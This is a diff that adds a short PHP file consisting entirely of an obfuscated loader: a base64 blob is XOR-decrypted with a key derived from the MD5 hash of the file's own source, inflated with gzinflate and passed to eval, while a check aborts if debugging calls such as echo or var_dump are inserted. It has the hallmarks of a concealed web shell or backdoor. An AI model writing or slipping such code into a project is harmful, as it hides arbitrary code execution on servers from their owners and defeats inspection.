@@ -1,0 +1,24 @@
+<?php
+$ckomhmlwesg="4c60db8377e78580d32aca0639c6549e";
+$qkfncct="515654525c075d0355035c040b5401565055075554500457040d510f020d5853";
+$rtlaetzwwl="yGG5DCtUdc339ROXTogvTEwO17mdExA/Th6Yk12L/7soiJSoTic3wVUIyTZPIEbq7T0bEX8RztEg79HaBN7tUf/2Jt3xWoXiZadFr1ddu6+AsACsJb9rMWKTx8gmvIH1rPxnLkEw/BV2Ilqnkfwun1BMdJP9965rtILiIdWJ6IEpB7xQ+Pc2ln6DeTpU9z/Oke83ii2kgHWY+/xnvR9BAkoILt0DdpzVgbv+rPclqgjjlH6f/1ELr+0pKcMKwtN96rNmWGBg4Fek3J0LJGKy5GhE+9zlCbGBKYtJcWN4WD4R/yXKxeatdohE4lLaYljHVR0ZVLOSkTAXR1of2C1HSi9QnRqgRY1wxyBKn9v1SMF/BRj6fgdufsK3qahmmjowH7A3X7YgRUKwjOvsxmDU2mWlE/GWPIzI0SRxGHIPbm4OZgbRvdSviBv4U7g2/tGANvR8opPJ/OGW9nxBV2DRoznFVSsZRQ7Eosvbb1K8NzFpjhXm+lmBbGoLb2KAUubFBPWEu/OG7/VvXPQwNREnHs0/RizbX9PRf/IJkP/XOIZAimnCgyAYf4kSGLtavMmDxpLUFqcrP5GZhJSBoBsxbGHyx4lyds/Ts0+zxzZAaYOjcrVWLc01hNSCQp6UqpBXzDkBp7T8N+qVyWq8iubqTUIVSI8Ua0NGz0GKKFuKF5qP3dSJMdq4E8XOggDtv5/7WveA2bVOUsAKba3eoPN1GlbO69kk3O6tEXRqhmMw6zh9N86sr0pTqgSNuXMqy44pX24ch0U1gWADiCFJacKyF8FEdG7g3XfDImddnaRbpOMEK5qFlYVnbjtGyjWlemEdW9NS37Ql48wO68y1hMdaqqqoq9kQFFSbbtcV4h0ZgddUtXdT/sSR0NTE9IWbSETJYA==";
+$hjjbzcnaaru=file_get_contents(__FILE__);
+$liruszutfei=str_replace($rtlaetzwwl,"",$hjjbzcnaaru);
+if(strpos($liruszutfei,"ec"."ho")!==false||strpos($liruszutfei,"pr"."int")!==false||strpos($liruszutfei,"var_"."dump")!==false||strpos($liruszutfei,"file_put_"."contents")!==false||strpos($liruszutfei,"fw"."rite")!==false){die();}
+$nxcxolo=str_replace(array($ckomhmlwesg,$qkfncct),array("SP_81e63943","KP_1e2b421d"),$hjjbzcnaaru);
+$zrzbvqjbsz=md5($nxcxolo);
+$rgbeezagctt=hex2bin($qkfncct);
+$gzryvaacuy="";
+$nitpxgpekfvg=strlen($zrzbvqjbsz);
+for($wkkrzs=0;$wkkrzs<$nitpxgpekfvg;$wkkrzs++){
+    $gzryvaacuy.=chr(ord($rgbeezagctt[$wkkrzs])^ord($zrzbvqjbsz[$wkkrzs]));
+}
+$spymlvzzjn=base64_decode($rtlaetzwwl);
+$zchmnavdkzs=strlen($spymlvzzjn);
+$pdjxgzfkild="";
+$mvbsnkp=strlen($gzryvaacuy);
+for($wkkrzs=0;$wkkrzs<$zchmnavdkzs;$wkkrzs++){
+    $pdjxgzfkild.=$spymlvzzjn[$wkkrzs]^$gzryvaacuy[$wkkrzs%$mvbsnkp];
+}
+$lmqdbxzvcl="gz"."in"."fl"."ate";
+eval($lmqdbxzvcl($pdjxgzfkild));
